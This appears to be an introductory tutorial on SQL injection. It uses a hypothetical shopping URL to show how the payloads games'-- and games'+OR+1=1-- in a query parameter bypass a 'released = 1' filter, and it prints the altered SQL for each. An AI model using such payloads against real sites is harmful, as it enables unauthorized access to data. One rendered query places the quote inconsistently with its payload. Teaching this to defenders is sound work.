## Retrieving Hidden Data

You can see the data the hasn't permission for you.

###### Consider a Shopping App
> \https://shopping.com/products?category=games

On above url the query may be like:

>SELECT * from  products WHERE category = 'games' AND released = 1 

SQL query asks the database to return :

- [ ]  all details (\*)
- [ ]  from the products table
- [ ]  where the category is games
- [ ]  and released is 1 

*released = 1*  is restriction that  is used to hide products that are not released <br>
*released = 0*  may be for unreleased products.

#### Attack Construction

>\https://shopping.com/products?category=games'--

**SQL query**

>SELECT * from products WHERE category = 'games'--'' AND released = 1

- [ ] **--** Double dash is important thing and it's used for commenting in SQL 
- [ ] Now released=1 is commented so it will release all products including unreleased products.

Attack  for the category that we didn't know

> \https://shopping.com/products?category=games'+OR+1=1--

**SQL query**

> SELECT * from products WHERE category = 'games' OR 1=1'-- AND released = 1

This will return either the products of category of games, or 1 is equals to 1. Since 1=1 is always true the query will return all items.


